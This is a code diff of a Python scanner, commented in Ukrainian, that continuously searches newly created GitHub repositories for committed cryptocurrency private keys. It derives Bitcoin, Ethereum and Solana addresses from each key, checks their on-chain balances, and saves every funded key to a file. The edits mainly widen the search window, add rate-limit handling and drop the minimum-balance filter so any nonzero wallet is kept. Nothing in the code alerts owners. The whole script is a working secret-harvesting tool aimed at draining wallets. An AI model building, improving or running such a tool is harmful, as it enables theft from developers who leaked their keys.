@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import aiohttp
 import asyncio
 import base58
@@ -14,11 +15,19 @@ from solders.pubkey import Pubkey
 from solders.keypair import Keypair
 
 # Налаштування логування
-logging.basicConfig(
-    filename="scanner.log",
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s"
-)
+# Логер для просканованих репозиторіїв
+repo_logger = logging.getLogger('repo')
+repo_logger.setLevel(logging.INFO)
+repo_handler = logging.FileHandler('scanner_repos.log', encoding='utf-8')
+repo_handler.setFormatter(logging.Formatter('%(message)s'))
+repo_logger.addHandler(repo_handler)
+
+# Логер для інформаційних повідомлень і помилок
+info_error_logger = logging.getLogger('info_error')
+info_error_logger.setLevel(logging.INFO)
+info_error_handler = logging.FileHandler('scanner_info_errors.log', encoding='utf-8')
+info_error_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
+info_error_logger.addHandler(info_error_handler)
 
 # Завантаження змінних із .env
 load_dotenv()
@@ -26,14 +35,14 @@ load_dotenv()
 # Конфігурація
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
 ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY")
-ALCHEMY_SOLANA_API_KEY = os.getenv("ALCHEMY_SOLANA_API_KEY")
+HELIUS_API_KEY = os.getenv("HELIUS_API_KEY")
 if not GITHUB_TOKEN:
     raise ValueError("GITHUB_TOKEN not found in .env file")
 if not ETHERSCAN_API_KEY:
     raise ValueError("ETHERSCAN_API_KEY not found in .env file")
-if not ALCHEMY_SOLANA_API_KEY:
-    logging.warning("ALCHEMY_SOLANA_API_KEY not found. Solana balance checking disabled.")
-    print("Warning: ALCHEMY_SOLANA_API_KEY not found. Solana balance checking disabled.")
+if not HELIUS_API_KEY:
+    info_error_logger.warning("HELIUS_API_KEY not found. Solana balance checking disabled.")
+    print("Warning: HELIUS_API_KEY not found. Solana balance checking disabled.")
     SOLANA_AVAILABLE = False
 else:
     SOLANA_AVAILABLE = True
@@ -46,24 +55,17 @@ HEADERS = {
 BASE_URL = "https://api.github.com"
 BLOCKCHAIN_API = "https://blockchain.info/balance?active="
 ETHERSCAN_API = "https://api.etherscan.io/api"
-SOLANA_RPC = f"https://solana-mainnet.g.alchemy.com/v2/{ALCHEMY_SOLANA_API_KEY}"
+SOLANA_RPC = f"https://mainnet.helius-rpc.com/?api-key={HELIUS_API_KEY}"
 REPO_SCAN_TIMEOUT = 10  # Таймаут для сканування репозиторію (секунди)
 SOLANA_REQUEST_TIMEOUT = 5  # Таймаут для Solana-запитів (секунди)
-RECENT_MINUTES = 5  # Сканувати репозиторії, створені за останні 5 хвилин
-SCAN_INTERVAL_SECONDS = 60  # Інтервал між скануваннями (секунди)
+RECENT_MINUTES = 60  # Сканувати репозиторії, створені за останні 60 хвилин
+SCAN_DELAY_SECONDS = 60  # Інтервал між скануваннями (секунди)
 
-# Фіксовані ціни криптовалют (17 квітня 2025)
+# Фіксовані ціни криптовалют (21 травня 2025)
 CRYPTO_PRICES = {
     "bitcoin": 60000.0,  # $60,000 за BTC
     "ethereum": 2500.0,  # $2,500 за ETH
     "solana": 150.0      # $150 за SOL
-}
-
-# Пороги балансу (еквівалент $10)
-BALANCE_THRESHOLDS = {
-    "BTC": 10.0 / CRYPTO_PRICES["bitcoin"],  # 0.00016667 BTC
-    "ETH": 10.0 / CRYPTO_PRICES["ethereum"], # 0.004 ETH
-    "SOL": 10.0 / CRYPTO_PRICES["solana"]    # 0.06666667 SOL
 }
 
 # Ключові слова, пов’язані з криптовалютою та платформами (150 термінів)
@@ -97,6 +99,7 @@ CRYPTO_KEYWORDS = [
 FOUND_KEYS = set()
 KEY_DUPLICATE_COUNT = {}  # Лічильник дублікатів ключів
 PROCESSED_REPOS = set()
+REPO_COUNT = 0  # Лічильник для нумерації репозиторіїв
 
 # Функція для перевірки, чи є рядок валідним Base58 приватним ключем
 def is_base58_key(data):
@@ -115,7 +118,7 @@ def is_hex_key(data):
         return False
     # Ігнорувати нульовий ключ
     if data == "0000000000000000000000000000000000000000000000000000000000000000":
-        logging.info(f"Skipping known test key: {data}")
+        info_error_logger.info(f"Skipping known test key: {data}")
         print(f"Skipping known test key: {data[:8]}...")
         return False
     return True
@@ -146,7 +149,7 @@ def private_key_to_btc_address(private_key, is_hex=False):
             key = Key(private_key, is_private=True, import_key=True, key_format='wif')
         return key.address()
     except Exception as e:
-        logging.error(f"Error converting private key to BTC address: {e}")
+        info_error_logger.error(f"Error converting private key to BTC address: {e}")
         print(f"Error converting private key to BTC address: {e}")
         return None
 
@@ -160,7 +163,7 @@ def private_key_to_eth_address(private_key):
         account = w3.eth.account.from_key(private_key)
         return account.address
     except Exception as e:
-        logging.error(f"Error converting private key to ETH address: {e}")
+        info_error_logger.error(f"Error converting private key to ETH address: {e}")
         print(f"Error converting private key to ETH address: {e}")
         return None
 
@@ -173,7 +176,7 @@ def private_key_to_sol_address(private_key):
         keypair = Keypair.from_seed(private_key_bytes[:32])
         return str(keypair.pubkey())
     except Exception as e:
-        logging.error(f"Error converting private key to SOL address: {e}")
+        info_error_logger.error(f"Error converting private key to SOL address: {e}")
         print(f"Error converting private key to SOL address: {e}")
         return None
 
@@ -194,16 +197,16 @@ async def get_balance(session, private_key, is_hex=False, is_byte_array=False):
                         balance_satoshi = data.get(btc_address, {}).get("final_balance", 0)
                         balance_btc = balance_satoshi / 100_000_000
                         usd_value = balance_btc * CRYPTO_PRICES["bitcoin"]
-                        if balance_btc >= BALANCE_THRESHOLDS["BTC"]:
+                        if balance_btc > 0:
                             balances["BTC"] = balance_btc
                             print(f"Found Bitcoin balance: {balance_btc:.8f} BTC (${usd_value:.2f})")
                         else:
-                            print(f"Bitcoin balance too low: {balance_btc:.8f} BTC (${usd_value:.2f})")
+                            print(f"Bitcoin balance is zero: {balance_btc:.8f} BTC")
                     else:
-                        logging.warning(f"Failed to check BTC balance for {btc_address}: {response.status}")
+                        info_error_logger.warning(f"Failed to check BTC balance for {btc_address}: {response.status}")
                         print(f"Failed to check BTC balance: {response.status}")
             except Exception as e:
-                logging.error(f"Error checking BTC balance for {btc_address}: {e}")
+                info_error_logger.error(f"Error checking BTC balance for {btc_address}: {e}")
                 print(f"Error checking BTC balance: {e}")
 
     elif (is_hex or is_byte_array) and not is_base58_key(private_key):
@@ -227,19 +230,19 @@ async def get_balance(session, private_key, is_hex=False, is_byte_array=False):
                             balance_wei = int(data["result"])
                             balance_eth = balance_wei / 1_000_000_000_000_000_000
                             usd_value = balance_eth * CRYPTO_PRICES["ethereum"]
-                            if balance_eth >= BALANCE_THRESHOLDS["ETH"]:
+                            if balance_eth > 0:
                                 balances["ETH"] = balance_eth
                                 print(f"Found Ethereum balance: {balance_eth:.8f} ETH (${usd_value:.2f})")
                             else:
-                                print(f"Ethereum balance too low: {balance_eth:.8f} ETH (${usd_value:.2f})")
+                                print(f"Ethereum balance is zero: {balance_eth:.8f} ETH")
                         else:
-                            logging.warning(f"Failed to check ETH balance for {eth_address}: {data['message']}")
+                            info_error_logger.warning(f"Failed to check ETH balance for {eth_address}: {data['message']}")
                             print(f"Failed to check ETH balance: {data['message']}")
                     else:
-                        logging.warning(f"Failed to check ETH balance for {eth_address}: {response.status}")
+                        info_error_logger.warning(f"Failed to check ETH balance for {eth_address}: {response.status}")
                         print(f"Failed to check ETH balance: {response.status}")
             except Exception as e:
-                logging.error(f"Error checking ETH balance for {eth_address}: {e}")
+                info_error_logger.error(f"Error checking ETH balance for {eth_address}: {e}")
                 print(f"Error checking ETH balance: {e}")
 
         # Solana (якщо доступно)
@@ -263,19 +266,19 @@ async def get_balance(session, private_key, is_hex=False, is_byte_array=False):
                             balance_lamports = data.get("result", {}).get("value", 0)
                             balance_sol = balance_lamports / 1_000_000_000
                             usd_value = balance_sol * CRYPTO_PRICES["solana"]
-                            if balance_sol >= BALANCE_THRESHOLDS["SOL"]:
+                            if balance_sol > 0:
                                 balances["SOL"] = balance_sol
                                 print(f"Found Solana balance: {balance_sol:.8f} SOL (${usd_value:.2f})")
                             else:
-                                print(f"Solana balance too low: {balance_sol:.8f} SOL (${usd_value:.2f})")
+                                print(f"Solana balance is zero: {balance_sol:.8f} SOL")
                         else:
-                            logging.warning(f"Failed to check SOL balance for {sol_address}: {response.status}")
+                            info_error_logger.warning(f"Failed to check SOL balance for {sol_address}: {response.status}")
                             print(f"Failed to check SOL balance: {response.status}")
                 except asyncio.TimeoutError:
-                    logging.warning(f"Timeout checking SOL balance for {sol_address}: exceeded {SOLANA_REQUEST_TIMEOUT} seconds")
+                    info_error_logger.warning(f"Timeout checking SOL balance for {sol_address}: exceeded {SOLANA_REQUEST_TIMEOUT} seconds")
                     print(f"Timeout checking SOL balance for {sol_address}: exceeded {SOLANA_REQUEST_TIMEOUT} seconds")
                 except Exception as e:
-                    logging.error(f"Error checking SOL balance for {sol_address}: {e}")
+                    info_error_logger.error(f"Error checking SOL balance for {sol_address}: {e}")
                     print(f"Error checking SOL balance: {e}")
 
     return balances
@@ -285,12 +288,12 @@ async def scan_file_content(session, file_url, repo_name):
     try:
         async with session.get(file_url, headers=HEADERS) as response:
             if response.status != 200:
-                logging.warning(f"Failed to fetch file {file_url}: {response.status}")
+                info_error_logger.warning(f"Failed to fetch file {file_url}: {response.status}")
                 print(f"Warning: Failed to fetch file {file_url}: {response.status}")
                 return []
             content = await response.text()
     except Exception as e:
-        logging.error(f"Error fetching file {file_url}: {e}")
+        info_error_logger.error(f"Error fetching file {file_url}: {e}")
         print(f"Error fetching file {file_url}: {e}")
         return []
 
@@ -302,7 +305,7 @@ async def scan_file_content(session, file_url, repo_name):
         if is_base58_key(candidate):
             if candidate in FOUND_KEYS:
                 KEY_DUPLICATE_COUNT[candidate] = KEY_DUPLICATE_COUNT.get(candidate, 1) + 1
-                logging.info(f"Duplicate Base58 key in {repo_name}: {candidate} (count: {KEY_DUPLICATE_COUNT[candidate]})")
+                info_error_logger.info(f"Duplicate Base58 key in {repo_name}: {candidate} (count: {KEY_DUPLICATE_COUNT[candidate]})")
                 print(f"Duplicate Base58 key found in {repo_name}: {candidate[:8]}... (count: {KEY_DUPLICATE_COUNT[candidate]})")
                 continue
             print(f"Found Base58 key in {repo_name}: {candidate[:8]}...")
@@ -315,7 +318,7 @@ async def scan_file_content(session, file_url, repo_name):
                     "repo": repo_name,
                     "balances": balances
                 })
-                logging.info(f"Found Base58 key in {repo_name}: {candidate} with balances {balances}")
+                info_error_logger.info(f"Found Base58 key in {repo_name}: {candidate} with balances {balances}")
 
     # Пошук hex-ключів
     hex_candidates = re.findall(r"[0-9a-fA-F]{64}", content)
@@ -323,7 +326,7 @@ async def scan_file_content(session, file_url, repo_name):
         if is_hex_key(candidate):
             if candidate in FOUND_KEYS:
                 KEY_DUPLICATE_COUNT[candidate] = KEY_DUPLICATE_COUNT.get(candidate, 1) + 1
-                logging.info(f"Duplicate Hex key in {repo_name}: {candidate} (count: {KEY_DUPLICATE_COUNT[candidate]})")
+                info_error_logger.info(f"Duplicate Hex key in {repo_name}: {candidate} (count: {KEY_DUPLICATE_COUNT[candidate]})")
                 print(f"Duplicate Hex key found in {repo_name}: {candidate[:8]}... (count: {KEY_DUPLICATE_COUNT[candidate]})")
                 continue
             print(f"Found Hex key in {repo_name}: {candidate[:8]}...")
@@ -336,7 +339,7 @@ async def scan_file_content(session, file_url, repo_name):
                     "repo": repo_name,
                     "balances": balances
                 })
-                logging.info(f"Found Hex key in {repo_name}: {candidate} with balances {balances}")
+                info_error_logger.info(f"Found Hex key in {repo_name}: {candidate} with balances {balances}")
 
     # Пошук байтових ключів
     byte_array_candidates = re.findall(r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]", content)
@@ -345,7 +348,7 @@ async def scan_file_content(session, file_url, repo_name):
         if hex_key:
             if hex_key in FOUND_KEYS:
                 KEY_DUPLICATE_COUNT[hex_key] = KEY_DUPLICATE_COUNT.get(hex_key, 1) + 1
-                logging.info(f"Duplicate byte array key in {repo_name}: {candidate} (hex: {hex_key}, count: {KEY_DUPLICATE_COUNT[hex_key]})")
+                info_error_logger.info(f"Duplicate byte array key in {repo_name}: {candidate} (hex: {hex_key}, count: {KEY_DUPLICATE_COUNT[hex_key]})")
                 print(f"Duplicate byte array key found in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}..., count: {KEY_DUPLICATE_COUNT[hex_key]})")
                 continue
             print(f"Found byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
@@ -358,7 +361,7 @@ async def scan_file_content(session, file_url, repo_name):
                     "repo": repo_name,
                     "balances": balances
                 })
-                logging.info(f"Found byte array key in {repo_name}: {candidate} (hex: {hex_key}) with balances {balances}")
+                info_error_logger.info(f"Found byte array key in {repo_name}: {candidate} (hex: {hex_key}) with balances {balances}")
 
     return found_keys
 
@@ -370,12 +373,12 @@ async def scan_repository(session, repo):
     try:
         async with session.get(contents_url, headers=HEADERS) as response:
             if response.status != 200:
-                logging.warning(f"Failed to fetch contents for {repo_name}: {response.status}")
+                info_error_logger.warning(f"Failed to fetch contents for {repo_name}: {response.status}")
                 print(f"Warning: Failed to fetch contents for {repo_name}: {response.status}")
                 return []
             contents = await response.json()
     except Exception as e:
-        logging.error(f"Error fetching contents for {repo_name}: {e}")
+        info_error_logger.error(f"Error fetching contents for {repo_name}: {e}")
         print(f"Error fetching contents for {repo_name}: {e}")
         return []
 
@@ -402,7 +405,7 @@ def save_keys(keys):
     with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
         for key_info in keys:
             f.write(f"{key_info['key']}\n")
-    logging.info(f"Saved {len(keys)} keys to {OUTPUT_FILE}")
+    info_error_logger.info(f"Saved {len(keys)} keys to {OUTPUT_FILE}")
     print(f"Saved {len(keys)} keys to {OUTPUT_FILE}")
 
 # Асинхронна функція для завантаження пачки репозиторіїв
@@ -412,35 +415,57 @@ async def fetch_repos(session):
     start_time_str = start_time.strftime("%Y-%m-%dT%H:%M")  # Формат без секунд
     all_repos = []
     seen_repo_ids = set()  # Для уникнення дублікатів репозиторіїв
+    max_pages = 10  # Обмеження кількості сторінок для уникнення ліміту 1000 результатів
 
-    # Розбиваємо ключові слова на підмножини по 6 (5 OR операторів)
-    for i in range(0, len(CRYPTO_KEYWORDS), 6):
-        keywords_subset = CRYPTO_KEYWORDS[i:i+6]
+    # Розбиваємо ключові слова на підмножини по 5 (4 OR оператори)
+    for i in range(0, len(CRYPTO_KEYWORDS), 5):
+        keywords_subset = CRYPTO_KEYWORDS[i:i+5]
         if not keywords_subset:
             continue
         keywords_query = " OR ".join(keywords_subset)
         search_query = f"{keywords_query} created:>={start_time_str}"
-        search_url = f"{BASE_URL}/search/repositories?q={quote(search_query)}&sort=created&order=desc"
-        page = 1
+        encoded_query = quote(search_query)
+        operator_count = len(keywords_subset) - 1  # Кількість OR операторів
+        info_error_logger.info(f"Query length: {len(encoded_query)} characters, OR operators: {operator_count}")
+        print(f"Query length: {len(encoded_query)} characters, OR operators: {operator_count}")
+        if len(encoded_query) > 256:
+            info_error_logger.error(f"Query too long: {len(encoded_query)} characters")
+            print(f"Error: Query too long: {len(encoded_query)} characters")
+            continue
+        if operator_count > 5:
+            info_error_logger.error(f"Too many OR operators: {operator_count}")
+            print(f"Error: Too many OR operators: {operator_count}")
+            continue
+        search_url = f"{BASE_URL}/search/repositories?q={encoded_query}&sort=created&order=desc"
 
         print(f"Fetching repositories for keywords: {keywords_query} created after {start_time_str}...")
-        logging.info(f"Fetching repositories for keywords: {keywords_query} created after {start_time_str}...")
-        while True:
+        info_error_logger.info(f"Fetching repositories for keywords: {keywords_query} created after {start_time_str}...")
+        page = 1
+        while page <= max_pages:
             try:
                 async with session.get(f"{search_url}&page={page}&per_page=100", headers=HEADERS) as response:
+                    if response.status == 403 and "rate limit exceeded" in (await response.text()).lower():
+                        info_error_logger.warning("API rate limit exceeded, pausing for 60 seconds")
+                        print("API rate limit exceeded, pausing for 60 seconds...")
+                        await asyncio.sleep(60)
+                        break
                     if response.status != 200:
                         error_text = await response.text()
-                        logging.error(f"Error fetching repositories: {response.status}, Response: {error_text}")
+                        info_error_logger.error(f"Error fetching repositories: {response.status}, Response: {error_text}")
                         print(f"Error fetching repositories: {response.status}, Response: {error_text}")
                         break
                     remaining = response.headers.get("X-RateLimit-Remaining")
-                    logging.info(f"API requests remaining: {remaining}")
+                    info_error_logger.info(f"API requests remaining: {remaining}")
                     print(f"API requests remaining: {remaining}")
                     if int(remaining) < 10:
-                        logging.warning("Low API rate limit, pausing for 60 seconds")
+                        info_error_logger.warning("Low API rate limit, pausing for 60 seconds")
                         print("Low API rate limit, pausing for 60 seconds...")
                         await asyncio.sleep(60)
                     data = await response.json()
+                    total_count = data.get("total_count", 0)
+                    if total_count > 1000:
+                        info_error_logger.warning(f"Search results exceed 1000 ({total_count}), limiting to first 1000 results")
+                        print(f"Warning: Search results exceed 1000 ({total_count}), limiting to first 1000 results")
                     page_repos = data.get("items", [])
                     if not page_repos:
                         break
@@ -454,14 +479,14 @@ async def fetch_repos(session):
                         seen_repo_ids.add(repo["id"])
                     all_repos.extend(filtered_repos)
             except Exception as e:
-                logging.error(f"Error fetching repositories: {e}")
+                info_error_logger.error(f"Error fetching repositories: {e}")
                 print(f"Error fetching repositories: {e}")
                 break
 
             page += 1
-            await asyncio.sleep(2)  # Затримка для уникнення обмежень API
+            await asyncio.sleep(1)  # Затримка між сторінками
 
-        await asyncio.sleep(2)  # Затримка між підмножинами ключових слів
+        await asyncio.sleep(1)  # Затримка між підмножинами ключових слів
 
     # Сортування репозиторіїв від найновіших
     sorted_repos = sorted(
@@ -469,7 +494,7 @@ async def fetch_repos(session):
         key=lambda x: datetime.strptime(x["created_at"], "%Y-%m-%dT%H:%M:%SZ"),
         reverse=True
     )
-    logging.info(f"Fetched {len(sorted_repos)} repositories created after {start_time_str}")
+    info_error_logger.info(f"Fetched {len(sorted_repos)} repositories created after {start_time_str}")
     print(f"Fetched {len(sorted_repos)} repositories created after {start_time_str}")
     return sorted_repos
 
@@ -481,11 +506,13 @@ async def main_once():
         for repo in repos:
             repo_name = repo["full_name"]
             if repo_name in PROCESSED_REPOS:
-                logging.info(f"Skipping already processed repository: {repo_name}")
+                info_error_logger.info(f"Skipping already processed repository: {repo_name}")
                 print(f"Skipping already processed repository: {repo_name}")
                 continue
             created_at = datetime.strptime(repo["created_at"], "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=UTC)
-            logging.info(f"Scanning {repo_name} (created: {created_at})")
+            global REPO_COUNT
+            REPO_COUNT += 1
+            repo_logger.info(f"{REPO_COUNT} - {datetime.now(UTC).strftime('%Y-%m-%d %H:%M:%S')} - Scanning {repo_name} (created: {created_at})")
             print(f"Scanning {repo_name} (created: {created_at})")
             try:
                 keys = await asyncio.wait_for(
@@ -494,13 +521,13 @@ async def main_once():
                 )
                 if keys:
                     save_keys(keys)
-                    logging.info(f"Found {len(keys)} keys with positive balance in {repo_name}")
+                    info_error_logger.info(f"Found {len(keys)} keys with positive balance in {repo_name}")
                     print(f"Found {len(keys)} keys with positive balance in {repo_name}")
             except asyncio.TimeoutError:
-                logging.warning(f"Timeout scanning {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
+                info_error_logger.warning(f"Timeout scanning {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
                 print(f"Timeout scanning {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
             except Exception as e:
-                logging.error(f"Error scanning {repo_name}: {e}")
+                info_error_logger.error(f"Error scanning {repo_name}: {e}")
                 print(f"Error scanning {repo_name}: {e}")
             PROCESSED_REPOS.add(repo_name)
 
@@ -508,9 +535,9 @@ async def main_once():
 async def main():
     while True:
         await main_once()
-        print(f"Waiting {SCAN_INTERVAL_SECONDS} seconds for next scan...")
-        logging.info(f"Waiting {SCAN_INTERVAL_SECONDS} seconds for next scan...")
-        await asyncio.sleep(SCAN_INTERVAL_SECONDS)
+        info_error_logger.info(f"Waiting {SCAN_DELAY_SECONDS} seconds for next scan...")
+        print(f"Waiting {SCAN_DELAY_SECONDS} seconds for next scan...")
+        await asyncio.sleep(SCAN_DELAY_SECONDS)
 
 if __name__ == "__main__":
     asyncio.run(main())
